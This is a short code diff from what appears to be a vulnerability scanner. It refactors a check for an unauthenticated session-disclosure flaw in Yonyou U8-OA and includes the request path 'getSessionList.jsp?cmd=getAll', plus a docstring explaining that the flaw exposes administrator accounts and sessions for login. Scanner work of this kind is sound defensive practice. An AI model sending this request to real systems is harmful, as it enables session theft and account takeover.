@@ -8,12 +8,12 @@ yonyou_u8_oa_getsession_payloads = [
     {'path': 'getSessionList.jsp?cmd=getAll'},
 ]
 
-def u8_oa_getsession_scan(self, clients):
+def u8_oa_getsession_scan(clients):
     '''  通过该漏洞, 攻击者可以获取数据库中管理员的账户信息以及session, 可利用session登录相关账号 '''
     client = clients.get('reqClient')
 
     vul_info = {
-       'app_name': self.app_name + 'U8-OA',
+       'app_name': 'Yonyou-U8-OA',
        'vul_type': 'DSinfo',
        'vul_id': 'Yonyou-u8-getSessionList-unAuth',
     }
